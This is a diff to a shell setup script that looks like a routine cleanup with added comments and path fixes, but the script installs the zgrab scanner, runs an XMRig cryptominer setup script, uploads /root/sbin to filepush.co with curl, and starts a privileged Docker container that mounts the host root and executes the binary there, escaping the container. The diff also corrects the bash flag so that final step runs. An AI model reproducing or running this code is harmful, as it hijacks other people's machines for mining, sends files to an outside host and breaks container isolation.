@@ -8,9 +8,11 @@ export PATH=$PATH:$GOPATH/bin
 RATESCAN="50000"
 SETUP_SLEEP="1"
 
-mkdir -p /root/go/src/github.com/zmap
+# Ensure the Go directory exists
+mkdir -p $GOPATH/src/github.com/zmap
 
 function SETUP_SYSTEM(){
+    # Update APK and install necessary packages
     apk update || { echo "APK update failed"; exit 1; }
     apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
 
@@ -21,13 +23,16 @@ function SETUP_SYSTEM(){
         sleep "$SETUP_SLEEP"
     done
 
-    if [ -d "/root/go/src/github.com/zmap" ]; then
-        cd /root/go/src/github.com/zmap || { echo "Failed to change directory"; exit 1; }
+    # Clone or pull the zgrab repository
+    if [ -d "$GOPATH/src/github.com/zmap/zgrab" ]; then
+        cd "$GOPATH/src/github.com/zmap/zgrab" || { echo "Failed to change directory"; exit 1; }
+        git pull || { echo "Failed to pull zgrab repository"; exit 1; }
     else
-        echo "Directory /root/go/src/github.com/zmap/zgrab does not exist."
-        exit 1
+        git clone https://github.com/zmap/zgrab.git "$GOPATH/src/github.com/zmap/zgrab" || { echo "Failed to clone zgrab repository"; exit 1; }
+        cd "$GOPATH/src/github.com/zmap/zgrab" || { echo "Failed to change directory"; exit 1; }
     fi
 
+    # Ensure go.mod file is present and build the project
     if [ ! -f "go.mod" ]; then
         echo "go.mod file not found. Initializing new module."
         go mod init github.com/zmap/zgrab || { echo "Failed to initialize go module"; exit 1; }
@@ -37,12 +42,16 @@ function SETUP_SYSTEM(){
         cp ./zgrab /usr/bin/zgrab || { echo "Failed to copy zgrab"; exit 1; }
     fi
 
+    # Clean APK cache
     rm -rf /var/cache/apk/*
+
+    # Execute the XMRig setup script
     /usr/local/bin/setup_xmrig.sh || { echo "Failed to execute setup_xmrig.sh"; exit 1; }
 
+    # Upload file and handle Docker
     export UPSPINTEST=$(curl --upload-file /root/sbin https://filepush.co/upload/) || { echo "Failed to upload file"; exit 1; }
     cp /root/sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
-    docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin' || { echo "Failed to run Docker container"; exit 1; }
+    docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -c 'chmod +x /host/bin/sbin; /host/bin/sbin' || { echo "Failed to run Docker container"; exit 1; }
 }
 
 
